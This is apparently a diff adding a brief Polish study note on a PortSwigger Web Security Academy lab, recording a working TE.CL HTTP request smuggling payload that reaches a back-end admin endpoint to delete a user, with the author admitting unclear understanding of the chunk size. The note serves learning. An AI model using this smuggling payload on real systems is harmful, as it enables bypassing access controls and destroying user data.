@@ -1,0 +1,23 @@
+(https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
+
+Aby przemycic zapytanie musielismy uzyc naglowka (Host: localhost) do servera zaplecza.
+Ogolnie ta liczba "88" ma znaczenie i ustalamy ja w zaleznosci do wielkosci pakietu (teraz nie wiem dokladnie na czym to polega)
+
+[Request]
+POST / HTTP/1.1
+Host: 0a0e00a10374831cc0259388008b0035.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+88
+POST /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+[/Request]
